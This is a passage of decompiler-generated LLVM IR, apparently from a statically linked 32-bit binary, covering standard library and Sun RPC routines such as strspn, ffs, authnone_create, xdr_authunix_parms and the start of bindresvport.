  %v0_8066de6 = phi i32 [ %v1_8066ddc, %dec_label_pc_8066ddc ], [ %v1_8066dd4, %dec_label_pc_8066dd4 ], [ %v1_8066dcc, %dec_label_pc_8066dcc ], [ %v0_8066db0, %dec_label_pc_8066dc4 ], [ %v0_8066d94, %dec_label_pc_8066d90 ]
  store i32 %v0_8066d85, i32* @ebx, align 4
  ret i32 %v0_8066de6

; uselistorder directives
  uselistorder i32 %v1_8066db9, { 1, 0 }
  uselistorder i32 %v1_8066db0, { 2, 1, 0 }
  uselistorder i32 %v2_8066da3, { 1, 0 }
  uselistorder i32 %v1_8066d94, { 1, 0, 2 }
  uselistorder i8 %v4_8066d90, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8066d8a, { 2, 1, 0 }
  uselistorder i32 %v4_8066d86, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8066de4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8066d99, { 1, 0 }
  uselistorder label %dec_label_pc_8066d90, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8066e0a31 = load i8, i8* %arg1, align 1
  %v4_8066e0c35 = icmp eq i8 %v2_8066e0a31, 0
  br i1 %v4_8066e0c35, label %dec_label_pc_8066e14, label %dec_label_pc_8066e10.lr.ph

dec_label_pc_8066e10.lr.ph:                       ; preds = %entry
  %v3_8066e0a32 = zext i8 %v2_8066e0a31 to i32
  %v4_8066e0a.pre = load i32, i32* @eax, align 4
  %v5_8066e0a33 = and i32 %v4_8066e0a.pre, -256
  %v6_8066e0a34 = or i32 %v3_8066e0a32, %v5_8066e0a33
  %v4_8066df1 = ptrtoint i8* %arg1 to i32
  %v1_8066dfc18 = inttoptr i32 %arg2 to i8*
  %v4_8066dfc.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8066e10

dec_label_pc_8066df7:                             ; preds = %dec_label_pc_8066e10, %dec_label_pc_8066dfb
  %v6_8066dfc28 = phi i32 [ %v6_8066dfc, %dec_label_pc_8066dfb ], [ %v6_8066dfc22, %dec_label_pc_8066e10 ]
  %v2_8066dfc27 = phi i8 [ %v2_8066dfc, %dec_label_pc_8066dfb ], [ %v2_8066dfc19, %dec_label_pc_8066e10 ]
  %v0_8066dfb26 = phi i32 [ %v1_8066dfb, %dec_label_pc_8066dfb ], [ %arg2, %dec_label_pc_8066e10 ]
  %v15_8066df7 = icmp eq i8 %v2_8066e0a39, %v2_8066dfc27
  br i1 %v15_8066df7, label %dec_label_pc_8066e04, label %dec_label_pc_8066dfb

dec_label_pc_8066dfb:                             ; preds = %dec_label_pc_8066df7
  %v1_8066dfb = add i32 %v0_8066dfb26, 1
  store i32 %v1_8066dfb, i32* @edx, align 4
  %v1_8066dfc = inttoptr i32 %v1_8066dfb to i8*
  %v2_8066dfc = load i8, i8* %v1_8066dfc, align 1
  %v3_8066dfc = zext i8 %v2_8066dfc to i32
  %v5_8066dfc = and i32 %v6_8066dfc28, -256
  %v6_8066dfc = or i32 %v3_8066dfc, %v5_8066dfc
  store i32 %v6_8066dfc, i32* @ecx, align 4
  %v4_8066dfe = icmp eq i8 %v2_8066dfc, 0
  %v1_8066e00 = icmp eq i1 %v4_8066dfe, false
  br i1 %v1_8066e00, label %dec_label_pc_8066df7, label %dec_label_pc_8066e14

dec_label_pc_8066e04:                             ; preds = %dec_label_pc_8066df7
  %v1_8066e08 = add i32 %v0_8066e1537, 1
  %v1_8066e09 = add i32 %v0_8066e0938, 1
  %v1_8066e0a = inttoptr i32 %v1_8066e09 to i8*
  %v2_8066e0a = load i8, i8* %v1_8066e0a, align 1
  %v3_8066e0a = zext i8 %v2_8066e0a to i32
  %v5_8066e0a = and i32 %v6_8066e0a40, -256
  %v6_8066e0a = or i32 %v3_8066e0a, %v5_8066e0a
  %v4_8066e0c = icmp eq i8 %v2_8066e0a, 0
  br i1 %v4_8066e0c, label %dec_label_pc_8066e14, label %dec_label_pc_8066e10

dec_label_pc_8066e10:                             ; preds = %dec_label_pc_8066e10.lr.ph, %dec_label_pc_8066e04
  %v4_8066dfc.pre = phi i32 [ %v4_8066dfc.pre.pre, %dec_label_pc_8066e10.lr.ph ], [ %v6_8066dfc28, %dec_label_pc_8066e04 ]
  %v6_8066e0a40 = phi i32 [ %v6_8066e0a34, %dec_label_pc_8066e10.lr.ph ], [ %v6_8066e0a, %dec_label_pc_8066e04 ]
  %v2_8066e0a39 = phi i8 [ %v2_8066e0a31, %dec_label_pc_8066e10.lr.ph ], [ %v2_8066e0a, %dec_label_pc_8066e04 ]
  %v0_8066e0938 = phi i32 [ %v4_8066df1, %dec_label_pc_8066e10.lr.ph ], [ %v1_8066e09, %dec_label_pc_8066e04 ]
  %v0_8066e1537 = phi i32 [ 0, %dec_label_pc_8066e10.lr.ph ], [ %v1_8066e08, %dec_label_pc_8066e04 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8066dfc19 = load i8, i8* %v1_8066dfc18, align 1
  %v3_8066dfc20 = zext i8 %v2_8066dfc19 to i32
  %v5_8066dfc21 = and i32 %v4_8066dfc.pre, -256
  %v6_8066dfc22 = or i32 %v3_8066dfc20, %v5_8066dfc21
  store i32 %v6_8066dfc22, i32* @ecx, align 4
  %v4_8066dfe23 = icmp eq i8 %v2_8066dfc19, 0
  %v1_8066e0025 = icmp eq i1 %v4_8066dfe23, false
  br i1 %v1_8066e0025, label %dec_label_pc_8066df7, label %dec_label_pc_8066e14

dec_label_pc_8066e14:                             ; preds = %entry, %dec_label_pc_8066e04, %dec_label_pc_8066e10, %dec_label_pc_8066dfb
  %v0_8066e1517 = phi i32 [ %v0_8066e1537, %dec_label_pc_8066dfb ], [ %v0_8066e1537, %dec_label_pc_8066e10 ], [ 0, %entry ], [ %v1_8066e08, %dec_label_pc_8066e04 ]
  ret i32 %v0_8066e1517

; uselistorder directives
  uselistorder i32 %v6_8066dfc22, { 1, 0 }
  uselistorder i8 %v2_8066dfc19, { 1, 2, 0 }
  uselistorder i32 %v1_8066e09, { 1, 0 }
  uselistorder i32 %v6_8066dfc, { 1, 0 }
  uselistorder i8 %v2_8066dfc, { 1, 2, 0 }
  uselistorder i32 %v1_8066dfb, { 2, 1, 0 }
  uselistorder i8 %v2_8066e0a31, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066e14, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8066e10, { 1, 0 }
}

define i32 @ffs(i16 %arg1) local_unnamed_addr {
entry:
  %v4_8066e1c = sext i16 %arg1 to i32
  store i32 %v4_8066e1c, i32* @ecx, align 4
  %v0_8066e20 = load i32, i32* @edx, align 4
  %v1_8066e20 = and i32 %v0_8066e20, -256
  %v2_8066e20 = or i32 %v1_8066e20, 1
  store i32 %v2_8066e20, i32* @edx, align 4
  %v4_8066e22 = icmp eq i16 %arg1, 0
  %v1_8066e25 = icmp eq i1 %v4_8066e22, false
  br i1 %v1_8066e25, label %dec_label_pc_8066e2c, label %dec_label_pc_8066e27

dec_label_pc_8066e27:                             ; preds = %entry
  %v2_8066e27 = sdiv i32 %v4_8066e1c, 65536
  store i32 %v2_8066e27, i32* @ecx, align 4
  %v2_8066e2a = or i32 %v1_8066e20, 17
  store i32 %v2_8066e2a, i32* @edx, align 4
  br label %dec_label_pc_8066e2c

dec_label_pc_8066e2c:                             ; preds = %entry, %dec_label_pc_8066e27
  %v16_8066e30 = phi i32 [ %v2_8066e20, %entry ], [ %v2_8066e2a, %dec_label_pc_8066e27 ]
  %v0_8066e33 = phi i32 [ %v4_8066e1c, %entry ], [ %v2_8066e27, %dec_label_pc_8066e27 ]
  %v3_8066e2c = trunc i32 %v0_8066e33 to i8
  %v4_8066e2c = icmp eq i8 %v3_8066e2c, 0
  %v1_8066e2e = icmp eq i1 %v4_8066e2c, false
  br i1 %v1_8066e2e, label %dec_label_pc_8066e36, label %dec_label_pc_8066e30

dec_label_pc_8066e30:                             ; preds = %dec_label_pc_8066e2c
  %v2_8066e30 = add i32 %v16_8066e30, 8
  %v15_8066e30 = and i32 %v2_8066e30, 255
  %v18_8066e30 = or i32 %v15_8066e30, %v1_8066e20
  store i32 %v18_8066e30, i32* @edx, align 4
  %v2_8066e33 = sdiv i32 %v0_8066e33, 256
  store i32 %v2_8066e33, i32* @ecx, align 4
  br label %dec_label_pc_8066e36

dec_label_pc_8066e36:                             ; preds = %dec_label_pc_8066e2c, %dec_label_pc_8066e30
  %v16_8066e3b = phi i32 [ %v16_8066e30, %dec_label_pc_8066e2c ], [ %v18_8066e30, %dec_label_pc_8066e30 ]
  %v0_8066e3e = phi i32 [ %v0_8066e33, %dec_label_pc_8066e2c ], [ %v2_8066e33, %dec_label_pc_8066e30 ]
  %v2_8066e36 = urem i32 %v0_8066e3e, 16
  %v3_8066e36 = icmp eq i32 %v2_8066e36, 0
  %v1_8066e39 = icmp eq i1 %v3_8066e36, false
  br i1 %v1_8066e39, label %dec_label_pc_8066e41, label %dec_label_pc_8066e3b

dec_label_pc_8066e3b:                             ; preds = %dec_label_pc_8066e36
  %v2_8066e3b = add i32 %v16_8066e3b, 4
  %v15_8066e3b = and i32 %v2_8066e3b, 255
  %v17_8066e3b = and i32 %v16_8066e3b, -256
  %v18_8066e3b = or i32 %v15_8066e3b, %v17_8066e3b
  store i32 %v18_8066e3b, i32* @edx, align 4
  %v2_8066e3e = sdiv i32 %v0_8066e3e, 16
  store i32 %v2_8066e3e, i32* @ecx, align 4
  br label %dec_label_pc_8066e41

dec_label_pc_8066e41:                             ; preds = %dec_label_pc_8066e36, %dec_label_pc_8066e3b
  %v16_8066e46 = phi i32 [ %v16_8066e3b, %dec_label_pc_8066e36 ], [ %v18_8066e3b, %dec_label_pc_8066e3b ]
  %v0_8066e49 = phi i32 [ %v0_8066e3e, %dec_label_pc_8066e36 ], [ %v2_8066e3e, %dec_label_pc_8066e3b ]
  %v2_8066e41 = urem i32 %v0_8066e49, 4
  %v3_8066e41 = icmp eq i32 %v2_8066e41, 0
  %v1_8066e44 = icmp eq i1 %v3_8066e41, false
  br i1 %v1_8066e44, label %dec_label_pc_8066e4c, label %dec_label_pc_8066e46

dec_label_pc_8066e46:                             ; preds = %dec_label_pc_8066e41
  %v2_8066e46 = add i32 %v16_8066e46, 2
  %v15_8066e46 = and i32 %v2_8066e46, 255
  %v17_8066e46 = and i32 %v16_8066e46, -256
  %v18_8066e46 = or i32 %v15_8066e46, %v17_8066e46
  store i32 %v18_8066e46, i32* @edx, align 4
  %v2_8066e49 = sdiv i32 %v0_8066e49, 4
  store i32 %v2_8066e49, i32* @ecx, align 4
  br label %dec_label_pc_8066e4c

dec_label_pc_8066e4c:                             ; preds = %dec_label_pc_8066e41, %dec_label_pc_8066e46
  %v0_8066e55 = phi i32 [ %v16_8066e46, %dec_label_pc_8066e41 ], [ %v18_8066e46, %dec_label_pc_8066e46 ]
  %v0_8066e52 = phi i32 [ %v0_8066e49, %dec_label_pc_8066e41 ], [ %v2_8066e49, %dec_label_pc_8066e46 ]
  %v1_8066e4e = icmp eq i32 %v0_8066e52, 0
  br i1 %v1_8066e4e, label %dec_label_pc_8066e5e, label %dec_label_pc_8066e52

dec_label_pc_8066e52:                             ; preds = %dec_label_pc_8066e4c
  %v1_8066e55 = mul i32 %v0_8066e55, 16777216
  %v2_8066e55 = sdiv i32 %v1_8066e55, 16777216
  store i32 %v2_8066e55, i32* @edx, align 4
  %v1_8066e52 = urem i32 %v0_8066e52, 2
  %v1_8066e58 = xor i32 %v1_8066e52, 1
  %v2_8066e5b = add nsw i32 %v1_8066e58, %v2_8066e55
  br label %dec_label_pc_8066e5e

dec_label_pc_8066e5e:                             ; preds = %dec_label_pc_8066e4c, %dec_label_pc_8066e52
  %v0_8066e5e = phi i32 [ 0, %dec_label_pc_8066e4c ], [ %v2_8066e5b, %dec_label_pc_8066e52 ]
  ret i32 %v0_8066e5e

; uselistorder directives
  uselistorder i32 %v2_8066e55, { 1, 0 }
  uselistorder i32 %v2_8066e49, { 1, 0 }
  uselistorder i32 %v0_8066e49, { 2, 0, 1 }
  uselistorder i32 %v16_8066e46, { 1, 2, 0 }
  uselistorder i32 %v2_8066e3e, { 1, 0 }
  uselistorder i32 %v0_8066e3e, { 2, 0, 1 }
  uselistorder i32 %v16_8066e3b, { 1, 2, 0 }
  uselistorder i32 %v2_8066e33, { 1, 0 }
  uselistorder i32 %v0_8066e33, { 1, 0, 2 }
  uselistorder i32 %v16_8066e30, { 1, 0 }
  uselistorder i32 %v2_8066e27, { 1, 0 }
  uselistorder i32 %v4_8066e1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8066e5e, { 1, 0 }
  uselistorder label %dec_label_pc_8066e4c, { 1, 0 }
  uselistorder label %dec_label_pc_8066e41, { 1, 0 }
  uselistorder label %dec_label_pc_8066e36, { 1, 0 }
  uselistorder label %dec_label_pc_8066e2c, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_8066e60 = load i32, i32* @eax, align 4
  ret i32 %v0_8066e60
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_8066e6a = load i32, i32* @eax, align 4
  ret i32 %v0_8066e6a
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8066e6b = load i32, i32* @ebx, align 4
  %v1_8066e6f = call i32 @__rpc_thread_variables(i32 %v0_8066e6b)
  %v1_8066e7a = add i32 %v1_8066e6f, 152
  %v2_8066e7a = inttoptr i32 %v1_8066e7a to i32*
  %v3_8066e7a = load i32, i32* %v2_8066e7a, align 4
  %v1_8066e80 = icmp eq i32 %v3_8066e7a, 0
  br i1 %v1_8066e80, label %dec_label_pc_8066e98, label %dec_label_pc_8066e84

dec_label_pc_8066e84:                             ; preds = %entry
  %v1_8066e85 = add i32 %arg1, 4
  %v2_8066e85 = inttoptr i32 %v1_8066e85 to i32*
  %v3_8066e85 = load i32, i32* %v2_8066e85, align 4
  %v1_8066e8b = add i32 %v3_8066e7a, 40
  %v5_8066e90 = add i32 %v3_8066e85, 12
  %v6_8066e90 = inttoptr i32 %v5_8066e90 to i32*
  %v7_8066e90 = load i32, i32* %v6_8066e90, align 4
  call void @__pseudo_call(i32 %v7_8066e90)
  br label %dec_label_pc_8066e98

dec_label_pc_8066e98:                             ; preds = %entry, %dec_label_pc_8066e84
  %v0_8066e98 = phi i32 [ 0, %entry ], [ %v1_8066e8b, %dec_label_pc_8066e84 ]
  ret i32 %v0_8066e98

; uselistorder directives
  uselistorder label %dec_label_pc_8066e98, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v0_8066ea0 = load i32, i32* @ebx, align 4
  %v1_8066ea4 = call i32 @__rpc_thread_variables(i32 %v0_8066ea0)
  store i32 %v1_8066ea4, i32* %eax.global-to-local, align 4
  %v1_8066ea9 = add i32 %v1_8066ea4, 152
  %v2_8066ea9 = inttoptr i32 %v1_8066ea9 to i32*
  %v3_8066ea9 = load i32, i32* %v2_8066ea9, align 4
  store i32 %v3_8066ea9, i32* @esi, align 4
  store i32 %v1_8066ea4, i32* @ebx, align 4
  %v1_8066eb1 = icmp eq i32 %v3_8066ea9, 0
  %v1_8066eb3 = icmp eq i1 %v1_8066eb1, false
  br i1 %v1_8066eb3, label %dec_label_pc_8066ed1, label %dec_label_pc_8066eb5

dec_label_pc_8066eb5:                             ; preds = %entry
  %v5_8066ebb = call i32 @calloc(i64 1, i32 64, i32 %v1_8066ea4, i32 %v1_8066ea4)
  store i32 %v5_8066ebb, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8066ec7 = icmp eq i32 %v5_8066ebb, 0
  br i1 %v1_8066ec7, label %dec_label_pc_8066f46, label %dec_label_pc_8066ecb

dec_label_pc_8066ecb:                             ; preds = %dec_label_pc_8066eb5
  %v1_8066ecb = load i32, i32* @ebx, align 4
  %v2_8066ecb = add i32 %v1_8066ecb, 152
  %v3_8066ecb = inttoptr i32 %v2_8066ecb to i32*
  store i32 %v5_8066ebb, i32* %v3_8066ecb, align 4
  %v0_8066ed1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8066ed1

dec_label_pc_8066ed1:                             ; preds = %entry, %dec_label_pc_8066ecb
  %v0_8066eda = phi i32 [ %v3_8066ea9, %entry ], [ %v0_8066ed1.pre, %dec_label_pc_8066ecb ]
  %v1_8066ed1 = add i32 %v0_8066eda, 60
  %v2_8066ed1 = inttoptr i32 %v1_8066ed1 to i32*
  %v3_8066ed1 = load i32, i32* %v2_8066ed1, align 4
  %v4_8066ed1 = icmp eq i32 %v3_8066ed1, 0
  %v1_8066ed5 = icmp eq i1 %v4_8066ed1, false
  br i1 %v1_8066ed5, label %dec_label_pc_8066ed1.dec_label_pc_8066f44_crit_edge, label %dec_label_pc_8066ed7

dec_label_pc_8066ed1.dec_label_pc_8066f44_crit_edge: ; preds = %dec_label_pc_8066ed1
  br label %dec_label_pc_8066f44

dec_label_pc_8066ed7:                             ; preds = %dec_label_pc_8066ed1
  %v1_8066eda = add i32 %v0_8066eda, 12
  store i32 %v1_8066eda, i32* @ebx, align 4
  %v3_8066ee3 = inttoptr i32 %v1_8066eda to i16*
  %v4_8066ee3 = call i32 @memcpy(i16* %v3_8066ee3, i32 ptrtoint (i32* @global_var_807f800.744 to i32), i32 12)
  store i32 %v4_8066ee3, i32* %eax.global-to-local, align 4
  %v0_8066eed = load i32, i32* @ebx, align 4
  %v0_8066eee = load i32, i32* @esi, align 4
  %v3_8066eef = inttoptr i32 %v0_8066eee to i16*
  %v4_8066eef = call i32 @memcpy(i16* %v3_8066eef, i32 %v0_8066eed, i32 12)
  %v0_8066ef4 = load i32, i32* @esi, align 4
  %v1_8066ef4 = add i32 %v0_8066ef4, 40
  store i32 %v1_8066ef4, i32* %eax.global-to-local, align 4
  %v1_8066ef7 = add i32 %v0_8066ef4, 32
  %v2_8066ef7 = inttoptr i32 %v1_8066ef7 to i32*
  store i32 ptrtoint (i32* @global_var_806f0e4.788 to i32), i32* %v2_8066ef7, align 4
  %v0_8066f02 = load i32, i32* %eax.global-to-local, align 4
  %v2_8066f03 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8066f03, i32* @edi, align 4
  %v5_8066f08 = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-36, i32 %v0_8066f02, i32 20, i32 0)
  store i32 %v5_8066f08, i32* %eax.global-to-local, align 4
  %v0_8066f10 = load i32, i32* @esi, align 4
  %v2_8066f12 = call i32 @xdr_opaque_auth(i32 %v2_8066f03, i32 %v0_8066f10)
  store i32 %v0_8066f10, i32* %eax.global-to-local, align 4
  %v0_8066f19 = load i32, i32* @ebx, align 4
  %v2_8066f1b = call i32 @xdr_opaque_auth(i32 %v2_8066f03, i32 %v0_8066f19)
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v5_8066f27 = add i32 %tmp, 16
  %v6_8066f27 = inttoptr i32 %v5_8066f27 to i32*
  %v7_8066f27 = load i32, i32* %v6_8066f27, align 4
  call void @__pseudo_call(i32 %v7_8066f27)
  %v1_8066f2a = load i32, i32* @esi, align 4
  %v2_8066f2a = add i32 %v1_8066f2a, 60
  %v3_8066f2a = inttoptr i32 %v2_8066f2a to i32*
  store i32 %tmp, i32* %v3_8066f2a, align 4
  %v3_8066f2d = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_8066f2d, i32* %eax.global-to-local, align 4
  %v1_8066f34 = add i32 %v3_8066f2d, 28
  %v2_8066f34 = inttoptr i32 %v1_8066f34 to i32*
  %v3_8066f34 = load i32, i32* %v2_8066f34, align 4
  store i32 %v3_8066f34, i32* %eax.global-to-local, align 4
  %v1_8066f37 = icmp eq i32 %v3_8066f34, 0
  br i1 %v1_8066f37, label %dec_label_pc_8066f44, label %dec_label_pc_8066f3b

dec_label_pc_8066f3b:                             ; preds = %dec_label_pc_8066ed7
  call void @__pseudo_call(i32 %v3_8066f34)
  br label %dec_label_pc_8066f44

dec_label_pc_8066f44:                             ; preds = %dec_label_pc_8066ed1.dec_label_pc_8066f44_crit_edge, %dec_label_pc_8066ed7, %dec_label_pc_8066f3b
  %v0_8066f44 = load i32, i32* @esi, align 4
  store i32 %v0_8066f44, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066f46

dec_label_pc_8066f46:                             ; preds = %dec_label_pc_8066eb5, %dec_label_pc_8066f44
  %v0_8066f4c = phi i32 [ 0, %dec_label_pc_8066eb5 ], [ %v0_8066f44, %dec_label_pc_8066f44 ]
  ret i32 %v0_8066f4c

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 60, { 19, 20, 16, 17, 0, 18, 2, 11, 21, 9, 3, 12, 13, 1, 14, 15, 25, 23, 24, 22, 26, 27, 28, 10, 5, 4, 6, 7, 8 }
  uselistorder i32 (i64, i32, i32, i32)* @calloc, { 2, 0, 3, 1 }
  uselistorder i32 64, { 8, 5, 31, 11, 15, 7, 16, 2, 6, 0, 36, 37, 39, 38, 32, 33, 17, 18, 34, 19, 20, 21, 22, 40, 23, 35, 14, 24, 25, 26, 27, 28, 29, 30, 4, 12, 13, 3, 1, 9, 10 }
  uselistorder i64 1, { 2, 3, 4, 0, 1 }
  uselistorder i32 152, { 4, 5, 1, 2, 0, 3, 6, 7 }
  uselistorder label %dec_label_pc_8066f46, { 1, 0 }
  uselistorder label %dec_label_pc_8066f44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066ed1, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp1 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8066f50 = load i32, i32* @esi, align 4
  %v0_8066f51 = load i32, i32* @ebx, align 4
  store i32 %v0_8066f51, i32* %stack_var_-8, align 4
  store i32 %tmp1, i32* @esi, align 4
  %v3_8066f5f = call i32 @xdr_u_long(i32* %arg1, i32 %arg2)
  %v1_8066f67 = icmp eq i32 %v3_8066f5f, 0
  br i1 %v1_8066f67, label %dec_label_pc_8066fce, label %dec_label_pc_8066f6b

dec_label_pc_8066f6b:                             ; preds = %entry
  %v0_8066f71 = load i32, i32* @ebx, align 4
  %v1_8066f71 = add i32 %v0_8066f71, 4
  %v0_8066f75 = load i32, i32* @esi, align 4
  %v3_8066f76 = inttoptr i32 %v0_8066f75 to i32*
  %v4_8066f76 = call i32 @__GI_xdr_string(i32* %v3_8066f76, i32 %v1_8066f71, i32 255)
  %v1_8066f7e = icmp eq i32 %v4_8066f76, 0
  br i1 %v1_8066f7e, label %dec_label_pc_8066fce, label %dec_label_pc_8066f82

dec_label_pc_8066f82:                             ; preds = %dec_label_pc_8066f6b
  %v0_8066f84 = load i32, i32* @ebx, align 4
  %v1_8066f84 = add i32 %v0_8066f84, 8
  store i32 %v1_8066f84, i32* @eax, align 4
  %v0_8066f88 = load i32, i32* @esi, align 4
  %v4_8066f89 = inttoptr i32 %v0_8066f88 to i32*
  %v5_8066f89 = call i32 @xdr_u_long(i32* %v4_8066f89, i32 %v1_8066f84)
  %v1_8066f91 = icmp eq i32 %v5_8066f89, 0
  br i1 %v1_8066f91, label %dec_label_pc_8066fce, label %dec_label_pc_8066f95

dec_label_pc_8066f95:                             ; preds = %dec_label_pc_8066f82
  %v0_8066f97 = load i32, i32* @ebx, align 4
  %v1_8066f97 = add i32 %v0_8066f97, 12
  store i32 %v1_8066f97, i32* @eax, align 4
  %v0_8066f9b = load i32, i32* @esi, align 4
  %v4_8066f9c = inttoptr i32 %v0_8066f9b to i32*
  %v5_8066f9c = call i32 @xdr_u_long(i32* %v4_8066f9c, i32 %v1_8066f97)
  %v1_8066fa4 = icmp eq i32 %v5_8066f9c, 0
  br i1 %v1_8066fa4, label %dec_label_pc_8066fce, label %dec_label_pc_8066fa8

dec_label_pc_8066fa8:                             ; preds = %dec_label_pc_8066f95
  %v0_8066fa8 = load i32, i32* @ecx, align 4
  %v0_8066fb3 = load i32, i32* @ebx, align 4
  %v1_8066fb3 = add i32 %v0_8066fb3, 16
  %v1_8066fb7 = add i32 %v0_8066fb3, 20
  %v0_8066fbb = load i32, i32* @esi, align 4
  %v8_8066fbc = inttoptr i32 %v0_8066fbb to i32*
  %v9_8066fbc = call i32 @__GI_xdr_array(i32* %v8_8066fbc, i32 %v1_8066fb7, i32 %v1_8066fb3, i32 16, i32 4, i32 134629107, i32 %v0_8066fa8, i32 %v0_8066fa8)
  %v1_8066fc4 = icmp eq i32 %v9_8066fbc, 0
  %v1_8066fc6 = icmp eq i1 %v1_8066fc4, false
  %v2_8066fc6 = zext i1 %v1_8066fc6 to i32
  br label %dec_label_pc_8066fd0

dec_label_pc_8066fce:                             ; preds = %dec_label_pc_8066f95, %dec_label_pc_8066f82, %dec_label_pc_8066f6b, %entry
  br label %dec_label_pc_8066fd0

dec_label_pc_8066fd0:                             ; preds = %dec_label_pc_8066fa8, %dec_label_pc_8066fce
  %storemerge = phi i32 [ %v2_8066fc6, %dec_label_pc_8066fa8 ], [ 0, %dec_label_pc_8066fce ]
  %v2_8066fd1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8066fd1, i32* @ebx, align 4
  store i32 %v0_8066f50, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32, i32)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 255, { 6, 0, 1, 2, 10, 50, 7, 4, 3, 8, 11, 12, 52, 9, 13, 5, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 51, 47, 49, 48 }
  uselistorder label %dec_label_pc_8066fd0, { 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-32, align 4
  %v0_8066fd7 = load i32, i32* @ebx, align 4
  %v4_8066fdb = ptrtoint i16* %arg2 to i32
  store i32 %v4_8066fdb, i32* @ebx, align 4
  %v1_8066fe3 = icmp eq i16* %arg2, null
  %v1_8066fe5 = icmp eq i1 %v1_8066fe3, false
  br i1 %v1_8066fe5, label %dec_label_pc_8067002, label %dec_label_pc_8066fe7

dec_label_pc_8066fe7:                             ; preds = %entry
  %v2_8066fec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8066fec, i32* @ebx, align 4
  %v4_8066ff1 = bitcast i32* %stack_var_-32 to i8*
  %v5_8066ff1 = call i32 @__GI_memset(i8* %v4_8066ff1, i32 0, i32 16)
  store i32 %v5_8066ff1, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  br label %dec_label_pc_806701b

dec_label_pc_8067002:                             ; preds = %entry
  %v2_8067002 = load i16, i16* %arg2, align 2
  %v11_8067002 = icmp eq i16 %v2_8067002, 2
  br i1 %v11_8067002, label %dec_label_pc_806701b, label %dec_label_pc_8067008

dec_label_pc_8067008:                             ; preds = %dec_label_pc_8067002
  %v1_8067008 = call i32 @__errno_location(i32 %v0_8066fd7)
  %v1_806700d = inttoptr i32 %v1_8067008 to i32*
  store i32 96, i32* %v1_806700d, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80670a1

dec_label_pc_806701b:                             ; preds = %dec_label_pc_8067002, %dec_label_pc_8066fe7
  %v0_8067025 = phi i32 [ %tmp9, %dec_label_pc_8067002 ], [ 2, %dec_label_pc_8066fe7 ]
  %v0_806701b = load i16, i16* @global_var_807e088.789, align 8
  %v1_806701b = icmp eq i16 %v0_806701b, 0
  %v1_8067023 = icmp eq i1 %v1_806701b, false
  br i1 %v1_8067023, label %dec_label_pc_8067041, label %dec_label_pc_8067025

dec_label_pc_8067025:                             ; preds = %dec_label_pc_806701b
  %v1_8067025 = call i32 @__libc_getpid(i32 %v0_8067025)
  %v2_8067025 = sext i32 %v1_8067025 to i64
  %v2_8067031 = ashr i32 %v1_8067025, 31
  %v5_8067032 = zext i32 %v2_8067031 to i64
  %v6_8067032 = mul nuw i64 %v5_8067032, 4294967296
  %v7_8067032 = or i64 %v6_8067032, %v2_8067025
  %v9_8067032 = sdiv i64 %v7_8067032, 424
  %v10_8067032 = trunc i64 %v9_8067032 to i32
  store i32 %v10_8067032, i32* %eax.global-to-local, align 4
  %v11_8067032 = srem i64 %v7_8067032, 424
  %v12_8067032 = trunc i64 %v11_8067032 to i32
  %v1_8067034 = add i32 %v12_8067032, 600
  store i32 %v1_8067034, i32* %edx.global-to-local, align 4
  %v1_806703a = trunc i32 %v1_8067034 to i16
